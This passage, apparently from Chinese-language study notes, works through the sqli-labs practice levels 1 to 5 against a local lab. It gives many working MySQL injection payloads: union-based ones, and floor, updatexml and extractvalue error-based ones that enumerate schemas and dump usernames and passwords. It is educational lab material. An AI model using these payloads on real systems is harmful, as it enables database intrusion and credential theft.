class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="literal">-1</span><span class="string">&#x27; union select 1,2,schema_name from information_schema.schemata limit 1,1;--+</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> union <span class="built_in">select</span> <span class="number">1</span>,<span class="number">2</span>,schema_name from information_schema.schemata limit <span class="number">2</span>,<span class="number">1</span>;<span class="literal">--</span>+</span><br><span class="line">?id=<span class="literal">-1</span><span class="string">&#x27; union select 1,2,schema_name from information_schema.schemata limit 3,1;--+</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/godicee/img/main/f27746d2456cf923603ac43932b28736.png"><img src="https://cdn.nlark.com/yuque/0/2024/png/47779600/1729830298048-bd2a625e-a987-4aff-8cba-0b37c92913b8.png"><img src="https://raw.githubusercontent.com/godicee/img/main/a2b2d8f2f8be1a3a07566c15efd839e4.png"></p><p>把所有数据链接、拼接为一行，进行显示</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="literal">-1</span><span class="string">&#x27; union select 1,2,group_concat(schema_name) from information_schema.schemata;--+</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/godicee/img/main/d4fa2c9ac78cccda09fbc60f199ecebd.png"></p><p>查表（从 security 数据库中）</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="literal">-1</span><span class="string">&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;;--+</span></span><br><span class="line"><span class="string">table_schema=&#x27;</span>security<span class="string">&#x27;可能会带来单引号问题，建议转为16进制（且前面加上0x）</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> union <span class="built_in">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) from information_schema.tables <span class="built_in">where</span> table_schema=<span class="number">0</span>x7365637572697479;<span class="literal">--</span>+</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/godicee/img/main/04572bec018013e8421a6c0145ff8cd3.png"></p><p>查列名（有哪些字段）</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="literal">-1</span><span class="string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;;--+  // 编码如下</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> union <span class="built_in">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name) from information_schema.columns <span class="built_in">where</span> table_name=<span class="number">0</span>x7573657273;<span class="literal">--</span>+</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/godicee/img/main/0b738b504cba217864821a6825f4ec3c.png"></p><p>查列中的值</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="literal">-1</span><span class="string">&#x27; union select 1,2,group_concat(username,password) from security.users;--+</span></span><br><span class="line"><span class="string">可以看到密码和账号没有分开，用新的拼接函数。先拼接显示、再拼接为一行</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> union <span class="built_in">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(concat_ws(<span class="string">&#x27; &#x27;</span>,username,password))from security.users;<span class="literal">--</span>+</span><br><span class="line">?id=<span class="literal">-1</span><span class="string">&#x27; union select 1,2,group_concat(concat_ws(0x20,username,password))from security.users;--+  编码一下</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/godicee/img/main/62de48b12f61bedc8541455988f449f5.png"></p><p><img src="https://raw.githubusercontent.com/godicee/img/main/89b065d342f11836123daffebde4ea67.png"></p><h4 id="数字型-字符型判断"><a href="#数字型-字符型判断" class="headerlink" title="数字型&#x2F;字符型判断"></a>数字型&#x2F;字符型判断</h4><p><a href="https://blog.csdn.net/jenchoi413/article/details/125431401">数字型&#x2F;字符型判断参考文档</a></p><ul><li>首先要理解：查询字段本身的类型和报错的类型不是一个东西<ul><li>查询字段的类型是定义在数据库里的</li><li>报错类型是定义在后端代码里的<ul><li>指的我们输入数据被当作字符型还是数字对待</li></ul></li></ul></li><li>如下：<ul><li>字段 id 的类型可以是<code>int</code>&#x2F;<code>varchar</code></li><li>当 id 为 int 的时候，后面输入的也值可以是字符</li></ul></li><li>但是：<ul><li>比如<code>username</code>、<code>password</code>在数据库中这种一定是字符型的定义</li><li>其对应的查询字段也一定是字符型的（不会是数字）</li></ul></li></ul><p><img src="https://raw.githubusercontent.com/godicee/img/main/fa7372da5f1646f4ae3418a366f413c9.png"></p><p><a href="https://blog.csdn.net/jenchoi413/article/details/125431401">order by 判断方法</a></p><ul><li><p><strong><font style="color:#DF2A3F;">orderby 判断：</font></strong></p><ul><li>payload：<code>id=1 order by 9999--+</code>数字型会报错，字符型不会</li><li>数字型字符型指的是：我们传入的值是被当作什么类型的变量处理<ul><li>而不是指的 id 这个变量存在数据库中的类型</li></ul></li></ul></li><li><p>字符型（自动加上包裹符号）</p><ul><li>查询语句<code>select from user where id = &#39;1 order by 9999--+&#39;</code></li><li>没有用<code>&#39;</code>闭合的时候，注释符号<code>--+</code>是被当做查询值的一部分的（没有起作用）</li><li>实际上：只会截取到第一个不是数字的字母为止<ul><li><code>1 order by 9999 --+</code>这里就会直接被当作查 1，不会报错</li><li><code>1asdas</code>也会被当作查 1</li><li><code>asd1</code>就会报错</li></ul></li></ul></li><li><p>数字型（没有包裹符号）</p><ul><li>查询语句<code>select from user where id=1 order by 9999--+</code></li><li>这个时候注释符起作用了：查询 id 等于 1 的表项，按照第 9999 个属性字段排序</li><li>现实中肯定不存在 9999 个属性的表项，所以会报错</li></ul></li><li><p><strong><font style="color:#DF2A3F;">逻辑判断猜测：</font></strong></p><ul><li>id：可以存为<code>int</code>、<code>varchar</code>、<code>char</code>其查询值可能是数字，也可能是字符<ul><li>用第一种方式判断</li></ul></li><li>username、password 这种肯定是<code>varchar</code>、<code>char</code>不然会报错<ul><li>默认是字符型</li></ul></li></ul></li><li><p><strong><font style="color:#DF2A3F;">常规判断：</font></strong><code>**&lt;font style=&quot;color:#DF2A3F;&quot;&gt;and 1=1&lt;/font&gt;**</code><strong><font style="color:#DF2A3F;">、</font></strong><code>**&lt;font style=&quot;color:#DF2A3F;&quot;&gt;and 1=2&lt;/font&gt;**</code></p><ul><li>数字型：<ul><li><code>?id=1 and 1=1--+</code>逻辑对：不报错<ul><li>查询语句<code>select from user where id=1--+</code></li></ul></li><li><code>?id=1 and 1=2--+</code>逻辑不对：报错<ul><li>查询语句<code>select from user where id=2--+</code></li></ul></li></ul></li><li>字符型：<ul><li><code>?id=1 and 1=2--+</code>不报错：因为被当作整个字符串处理了<ul><li>查询语句<code>select from user where id=&#39;1 and 1=2--+&#39;</code></li><li><code>id</code>这个属性mysql 查询到 1 后面的第一个字母，就停止了，模糊判断<code>1 and 1=2--+</code>为 1</li></ul></li></ul></li></ul></li></ul><h4 id="L1-手工注入"><a href="#L1-手工注入" class="headerlink" title="L1 手工注入"></a>L1 手工注入</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#判断注入点：</span><br><span class="line">?id=1&#x27;显示报错，这里有注入点</span><br><span class="line"></span><br><span class="line">#判断输入值的类型</span><br><span class="line">?id=1 and 1=1不报错</span><br><span class="line">?id=1 and 1=2不报错</span><br><span class="line">（字符型）</span><br><span class="line"></span><br><span class="line">#判断有多少列</span><br><span class="line">?id=1&#x27;order by 10--+</span><br><span class="line">?id=1&#x27;order by 5--+</span><br><span class="line">?id=1&#x27;order by 4--+</span><br><span class="line">?id=1&#x27;order by 3--+找到不报错的位置（二分查找）</span><br><span class="line"></span><br><span class="line">#联合查询：查看哪些可以回显</span><br><span class="line">?id=-1&#x27; union select 1,2,3--+显示23可以回显</span><br><span class="line"></span><br><span class="line">#联合查询：查看当前是什么数据库</span><br><span class="line">?id=-1&#x27; union select 1,2,database()--+显示当前使用security数据库</span><br><span class="line"></span><br><span class="line">#联合查询：查库、查表、查表的字段、查库中某个表:字段为username/password字段的信息</span><br><span class="line">注意用作返回信息的列的返回数据类型，需与对应数据库中列的默认数据类型相同</span><br><span class="line">所以：这里用2,3都可以，1的字段是id类型可能是数字，也可能是字符</span><br><span class="line">?id=-1&#x27; union select 1,2,group_concat(schema_name) from information_schema.schemata;--+ 查看有哪些数据库</span><br><span class="line">?id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;;--+ 查看security中所有表，注意：table_schema容易打错</span><br><span class="line">?id=-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;;--+ 查看security中users表中的所有字段</span><br><span class="line">?id=-1&#x27; union select 1,2,group_concat(concat_ws(&#x27;:&#x27;,username,password)) from security.users;--+ 查security数据库中users表中的username和password字段的值</span><br><span class="line"></span><br><span class="line">#联合查询</span><br></pre></td></tr></table></figure><p>注意：在查表中所有字段时，我们上面使用的语句没有声明数据库，它会默认在当前使用的数据库中查询</p><p><code>?id=-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;;--+</code></p><p>如果需要指定数据库如：<code>security</code></p><p><code>?id=-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; and table_schema=&#39;security&#39;--+</code></p><h3 id="L2-数字型"><a href="#L2-数字型" class="headerlink" title="L2 数字型"></a>L2 数字型</h3><p>数字型和字符型的唯一区别就是：数字型不需要闭合单引号，字符型需要</p><p>判断基础信息</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;有报错</span><br><span class="line">#判断为字符型</span><br><span class="line">?id=1 and 1=1不报错</span><br><span class="line">?id=1 and 1=2报错</span><br><span class="line">#判断列数为3</span><br><span class="line">?id=1 order by 4--+报错</span><br><span class="line">?id=1 order by 3--+不报错</span><br><span class="line">#查回显：回显为2，3</span><br><span class="line">?id=-1 union select 1,2,3--+</span><br></pre></td></tr></table></figure><p>查库的信息</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#查有哪些库</span><br><span class="line">?id=-1 union select 1,2,group_concat(schema_name) from information_schema.schemata--+</span><br><span class="line">#查security库里有哪些表</span><br><span class="line">?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br><span class="line">#查users表里面有哪些字段</span><br><span class="line">?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27;--+</span><br><span class="line">#查users表中字段为username、password的所有信息</span><br><span class="line">?id=-1 union select 1,2,group_concat(concat_ws(&#x27;--&#x27;,username,password)) from security.users--+</span><br></pre></td></tr></table></figure><h3 id="L3-闭合符号’"><a href="#L3-闭合符号’" class="headerlink" title="L3 闭合符号’)"></a>L3 闭合符号’)</h3><p>闭合符号不同<code>&#39;)</code></p><p>判断类型</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#显然是字符型</span><br><span class="line">?id=1 and 1=1和?id=1 and 1=2都不报错</span><br><span class="line">#查看字段为3</span><br><span class="line">?id=1&#x27;) order by 3--+</span><br><span class="line">#后面不再赘述</span><br></pre></td></tr></table></figure><h3 id="L4-闭合符号”"><a href="#L4-闭合符号”" class="headerlink" title="L4 闭合符号”)"></a>L4 闭合符号”)</h3><p>闭合符合不同<code>&quot;)</code></p><ul><li>判断闭合符号<ul><li><code>&#39;</code>、<code>)</code>都不会报错，只有<code>&quot;</code>报错<ul><li>但是加上<code>?id=1&quot;--+还是报错</code>，可能不止一种闭合符号</li><li>测试<code>?id=1&quot;)--+</code>就不报错了</li><li>因此闭合符号为<code>&quot;)</code></li></ul></li></ul></li></ul><h3 id="L5-查询结果无回显（报错注入）"><a href="#L5-查询结果无回显（报错注入）" class="headerlink" title="L5 查询结果无回显（报错注入）"></a>L5 查询结果无回显（报错注入）</h3><h4 id="类型判断"><a href="#类型判断" class="headerlink" title="类型判断"></a>类型判断</h4><p>可以看到 id&#x3D;1 是对的，但是查询结果没有回显</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/8660dc1e619a6c73eef8ad7e3d69fbb3.png"></p><p>查看源代码，可以看到，源码里面没有写回显数据的函数</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/214623e5539c4682c5a0c4f252972920.png"></p><p>以前的关卡是写了返回结果的</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/f082607314d1edb27567b23c9c93a236.png"></p><p>这里需要报错注入了</p><ul><li>判断类型<ul><li><code>?id=1&#39;</code>报错</li><li><code>?id=1 and 1=1--+</code>不报错</li><li><code>?id=1 and 1=2--+</code>不报错</li><li>因此类型为字符型（逻辑判断被当作字符串内容解析了，而数据库模糊匹配：只匹配了 1）</li></ul></li></ul><h4 id="floor注入原理"><a href="#floor注入原理" class="headerlink" title="floor注入原理"></a>floor注入原理</h4><p><a href="https://blog.csdn.net/weixin_45146120/article/details/100062786">MYSQL floor 报错注入详解_mysql 报错注入 floor-CSDN博客</a></p><p>（不超过 64 字符）</p><p>语句<code>SELECT COUNT(*),floor(RAND(0)*2) as x from users GROUP BY x</code></p><ul><li><font style="color:#DF2A3F;">floor报错原理</font>：利用主键不能重复，使用随机数序列配合<code>group by</code>的逻辑<ul><li>数据库主键重复会报错</li><li><code>rand(0) * 2</code>会产生数字序列为<code>011011</code></li><li><code>group by</code>在统计数据时会产生虚表（临时表），用作统计<ul><li>在查询时会计算一次<code>rand(0) * 2</code>第一次是 0</li><li>如果表中没有该数据，向虚表插入数据会在计算一次<code>rand(0) * 2</code>第二次就变成 1</li></ul></li></ul></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">count  x</span><br><span class="line">  1 1</span><br></pre></td></tr></table></figure><pre><code>    * 查询第二个数据时计算一次`rand(0) * 2`第三次变成 1        + 但是表中已经有值为 1 的数据了，不需要插入，count+1 即可</code></pre><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">count  x</span><br><span class="line">  2 1</span><br></pre></td></tr></table></figure><pre><code>    * 查询第三个数据计算一次`rand(0) * 2`第四次变成 0        + 表中没有值为 0 的数据，需要插入        + 插入时再计算一次`rand(0) * 2`，第五次变为 1</code></pre><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">count  x</span><br><span class="line">  2 1</span><br><span class="line">  1 1</span><br></pre></td></tr></table></figure><ul><li>这样表中就有两个主键为 1 的表项，就会报错</li></ul><h4 id="floor-注入-payload"><a href="#floor-注入-payload" class="headerlink" title="floor 注入 payload"></a>floor 注入 payload</h4><p>（最多回显 64 个字符）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;union select count(*),0,</span><br><span class="line">concat(0x3a,</span><br><span class="line">    (&lt;payload&gt;),</span><br><span class="line">0x3a,floor(rand(0)*2)) </span><br><span class="line">as a from information_schema.tables group by a --+</span><br></pre></td></tr></table></figure><p><strong>获取</strong><code>**数据库**</code><img src="https://raw.githubusercontent.com/godicee/img/main/d5f047cdf3db55bbf5abc40c3eac964a.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;union select count(*),0,concat(0x3a,(select database()),0x3a,floor(rand(0)*2))</span><br><span class="line">as a from information_schema.tables group by a--+</span><br></pre></td></tr></table></figure><p><strong>获取</strong><code>**版本、数据库、用户**</code><img src="https://raw.githubusercontent.com/godicee/img/main/d97339b3dacaa224e520f82a8f57452e.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sql/Less-5/?id=1&#x27;union select count(*),0,</span><br><span class="line">concat((select concat(database(),0x3a,version(),0x3a,user())),0x3a,0x3a,floor(rand(0)*2)) as a </span><br><span class="line">from information_schema.tables group by a--+</span><br></pre></td></tr></table></figure><p><strong>查</strong><code>**security 数据库**</code><strong>中有哪些</strong><code>**表**</code><img src="https://raw.githubusercontent.com/godicee/img/main/2a36827ad9ff04565652fd10302b2539.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;union select count(*),0,</span><br><span class="line">concat((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x3a,floor(rand(0)*2)) as a </span><br><span class="line">from information_schema.tables group by a--+</span><br></pre></td></tr></table></figure><p><strong>查</strong><code>**security 数据库**</code><strong>中的</strong><code>**users**</code><strong>表有哪些列名</strong><img src="https://raw.githubusercontent.com/godicee/img/main/97014c10ce34a1b2a76c3e7d662a3907.png"></p><p><code>floor</code>报错注入只能回显 64 字符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">payload1</span><br><span class="line">?id=1&#x27; union select count(*),0,concat(0x3a,(select group_concat(column_name) </span><br><span class="line">from information_schema.columns where table_name=&#x27;users&#x27;),0x3a,floor(rand(0)*2)) as a </span><br><span class="line">from information_schema.tables group by a--+</span><br><span class="line">payload2</span><br><span class="line">?id=1&#x27; union select count(*),0,concat(0x3a,(select group_concat(column_name) </span><br><span class="line">from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27;),0x3a,floor(rand(0)*2)) as a </span><br><span class="line">from information_schema.tables group by a--+</span><br></pre></td></tr></table></figure><p>注意上面没有声明数据库，会有一些非我们想查数据库的冗余信息，推荐 <code>payload2</code></p><p><img src="https://raw.githubusercontent.com/godicee/img/main/c120915c2a4a78eeb753f6335a62f6a9.png"></p><p><strong>查</strong><code>**security.users**</code><strong>中的</strong><code>**username&amp;password**</code><strong>键的值</strong><img src="https://raw.githubusercontent.com/godicee/img/main/d201b3c8fb8170520766731f2ed53b8d.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">因为这里返回内容远超过64字符，会有问题，需要用substring(string,pos,len)控制返回长度</span><br><span class="line">（从0开始不能正常返回，需要从1开始，然后可以多段返回。使用limit不行，只能用substring）</span><br><span class="line">?id=1&#x27; union select count(*),0,concat((select substring(group_concat(concat_ws(&#x27;--&#x27;,username,password)),1,64) from security.users),0x3a,floor(rand(0)*2)) as a from information_schema.tables group by a--+</span><br><span class="line"></span><br><span class="line">查username</span><br><span class="line">?id=1&#x27; union select count(*),0,concat((select username from security.users limit 0,1),0x3a,floor(rand(0)*2)) as a from information_schema.tables group by a--+</span><br><span class="line">查password</span><br><span class="line">?id=1&#x27; union select count(*),0,concat((select password from security.users limit 0,1),0x3a,floor(rand(0)*2)) as a from information_schema.tables group by a--+</span><br></pre></td></tr></table></figure><h4 id="updatexml-extractvalue-原理"><a href="#updatexml-extractvalue-原理" class="headerlink" title="updatexml&#x2F;extractvalue 原理"></a>updatexml&#x2F;extractvalue 原理</h4><p><a href="https://www.cnblogs.com/c1047509362/p/12806297.html">MYSQL updatexml报错注入 - vspiders - 博客园</a></p><p>（不超过 32 字符）</p><ul><li><p><strong>总结：</strong></p><ul><li><code>updatexml(para1,para2,para3)</code>用于修改<ul><li>para1 文件名、para2 文件路径 Xpath、para3 新值</li></ul></li><li><code>extractvalue(para1,para2)</code><ul><li>para1 文件名、para2 文件路径 Xpath</li></ul></li><li><strong>payload 都在 para2 处，区别只是有没有 para3</strong><ul><li>para1 和 para3 随意填即可</li></ul></li></ul></li><li><p>在 mysql 高于 5.1 添加对 XML 文档查询&#x2F;修改的函数</p><ul><li><code>updatexml()、extractvalue()</code></li><li>当 xml 文档路径错误，会报错<ul><li>使用时当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）</li></ul></li></ul></li><li><p><code>updatexml(XML_document, XPath_string, new_value);</code>用不同的xml标记匹配和替换xml块的函数</p><ul><li><code>XML_document</code>是<code>String</code>格式，为<code>XML</code>文档对象名称（文中为 DOC）</li><li><code>XPath_string</code>是<code>Xpath</code>格式的字符串<ul><li>如<code>//title【@lang】</code></li></ul></li><li><code>new_value</code>是<code>String</code>格式（新的替换数据）</li></ul></li><li><p>如<code>select * from test where ide = 1 and (updatexml(1,0x7e,3));</code></p><ul><li>由于<code>0x7e</code>是<code>~</code>，不属于<code>xpath</code>语法格式，因此报出<code>xpath</code>语法错误</li></ul></li><li><p><code>extractvalue（XML_document，xpath_string)</code>从目标 XML 中返回包含查询值的字符串</p><ul><li><code>XML_document</code>是<code>String</code>格式，<code>XML</code>文档对象名称</li><li><code>xpath_string</code>是<code>Xpath</code>格式的字符串</li></ul></li><li><p>如下：</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</span><br></pre></td></tr></table></figure><h4 id="updatexml注入payload"><a href="#updatexml注入payload" class="headerlink" title="updatexml注入payload"></a>updatexml注入payload</h4><p>（不超过 32 字符）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and updatexml(1,concat(0x7e,(&lt;payload&gt;),0x7e),1) --+</span><br></pre></td></tr></table></figure><p><strong>查当前使用数据库</strong><img src="https://raw.githubusercontent.com/godicee/img/main/81aef2ff6f4c57cdf24866698b44edeb.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(select database())),1)--+</span><br></pre></td></tr></table></figure><p><strong>查有哪些数据库</strong><img src="https://raw.githubusercontent.com/godicee/img/main/9f86e46f9f1ed7e41903a21f5d909429.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这里可以自己调节substring来返回数据</span><br><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,substring((select group_concat(schema_name) from information_schema.schemata),35,32)),1)--+</span><br></pre></td></tr></table></figure><p><strong>查当前数据库名、版本、用户</strong><img src="https://raw.githubusercontent.com/godicee/img/main/10cf88ab10e20622e85c97212b03ef70.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,database(),version(),0x7e, user()),1)--+</span><br><span class="line">下面这样写也可以</span><br><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(select database()),(select version()),0x7e,(select user())),1)--+</span><br></pre></td></tr></table></figure><p><strong>查</strong><code>**security**</code><strong>数据库里有哪些表</strong><img src="https://raw.githubusercontent.com/godicee/img/main/82fb5ab01eeb66b511df93635e48ce28.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),1)--+</span><br></pre></td></tr></table></figure><p><strong>查</strong><code>**security**</code><strong>数据库中有哪些</strong><code>**columns**</code><img src="https://raw.githubusercontent.com/godicee/img/main/e2cb90348897d6e5a1c4afceee59cbb8.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema =&#x27;security&#x27;),1)--+</span><br></pre></td></tr></table></figure><p>使用<code>substring</code>调整返回数据<img src="https://raw.githubusercontent.com/godicee/img/main/68637c2ef8aeb5fccd914e48dda11313.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1,substring((select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema =&#x27;security&#x27;),1,32),1)--+</span><br></pre></td></tr></table></figure><p><strong>查</strong><code>**security.users**</code><strong>中的</strong><code>**username&amp;password**</code><strong>列</strong><img src="https://raw.githubusercontent.com/godicee/img/main/b8a06baa4ba799b49052423358c7ab80.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">使用substring调整了返回数据</span><br><span class="line">?id=1&#x27; and updatexml(1,substring((select group_concat(concat_ws(&#x27;:&#x27;,username,password)) from security.users),15,32),1)--+</span><br></pre></td></tr></table></figure><h4 id="extractvalue-注入payload"><a href="#extractvalue-注入payload" class="headerlink" title="extractvalue 注入payload"></a>extractvalue 注入payload</h4><p><strong>查当前使用的数据库、版本、用户</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and extractvalue(1,concat(0x3a,database(),0x3a,version(),0x3a,user()))--+</span><br></pre></td></tr></table></figure><p><strong>查有哪些数据库</strong><img src="https://raw.githubusercontent.com/godicee/img/main/0b3c2310fff9e9d0d0058e0bca17b947.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and extractvalue(1,substring((select group_concat(schema_name) from information_schema.schemata),35,32))--+</span><br></pre></td></tr></table></figure><p><strong>查</strong><code>**security**</code><strong>数据库中有哪些表</strong><img src="https://raw.githubusercontent.com/godicee/img/main/fe38535b9fde113fc099ba6453d659ca.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and extractvalue(1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;))--+</span><br></pre></td></tr></table></figure><p><strong>查</strong><code>**security**</code><strong>数据库中</strong><code>**users**</code><strong>表中有哪些</strong><code>**columns**</code><img src="https://raw.githubusercontent.com/godicee/img/main/55a1ebf6a53aba9055a0f92b5292ab9d.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and extractvalue(1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27;))--+</span><br></pre></td></tr></table></figure><p><strong>查</strong><code>**security.users**</code><strong>中的</strong><code>**username&amp;password**</code><img src="https://raw.githubusercontent.com/godicee/img/main/1749a6e70b94581e0ead8d23b0f3ce9e.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and extractvalue(1,substring((select group_concat(concat_ws(&#x27;_&#x27;,username,password)) from security.users),1,32))--+</span><br></pre></td></tr></table></figure><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ul><li><code>group_concat</code>用来把同一个返回字段，但是有多个返回值的，返回回来<ul><li>如<code>select group_concat(table_name) from information_schema.tables</code></li></ul></li><li><code>concat</code>用来连接多个不同字段，可以自定义连接符<ul><li>如<code>?id=1&#39; and updatexml(1,concat(0x3a,database(),0x3a,version()),1)--+</code></li></ul></li><li><code>concat_ws</code>用来连接不同字段，同时都有多个值，需要配合<code>group_concat 食用</code><ul><li>如<code>select group_concat(concat_ws(&#39;_&#39;,username,password)) from 